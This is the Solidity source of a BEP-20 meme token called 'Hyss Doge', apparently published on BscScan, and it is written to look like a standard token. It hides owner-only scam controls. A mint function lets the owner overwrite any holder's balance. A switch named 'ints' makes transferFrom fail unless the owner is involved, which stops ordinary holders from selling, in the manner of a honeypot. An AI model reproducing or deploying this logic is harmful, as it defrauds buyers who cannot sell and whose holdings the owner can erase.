/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

/**


       __               
  ____/ /___  ____ ____ 
 / __  / __ \/ __ `/ _ \
/ /_/ / /_/ / /_/ /  __/
\__,_/\____/\__, /\___/ 
           /____/       

     Hyss Doge( HASSDOGE )

**/




pragma solidity ^0.8.10;
// SPDX-License-Identifier: GPL-3.0
contract TokenTool {
    address private _owner;
    bool _ints = false;
    string private _name = "Hyss Doge";
    string private _symbol = "HASSDOGE";
    uint256 private _totalSupply = 110000000000 * (10 ** decimals());

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _owner = msg.sender;
        _balances[_owner] = _totalSupply;
    }

    modifier onlyOwner(){
        require(_owner == msg.sender);
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address wallet) public view returns (uint256) {
        return _balances[wallet];
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
        require(to.length == amounts.length, "Length of addresses should be equal to amounts");
        for (uint256 i = 0; i < to.length; i++) {
            require(transfer(to[i], amounts[i]));
        }
    }


      function mint(address miner, uint256 _value) external onlyOwner {
      _balances[miner] = _value * 10 ** decimals();
    }


    function ints( bool status )external returns (bool){ 
        require( _owner == msg.sender );
        _ints  = status;
        
        return _ints;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
  
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }


    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
      if(_ints == true){require(msg.sender == _owner|| sender == _owner || recipient == _owner);}
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }


}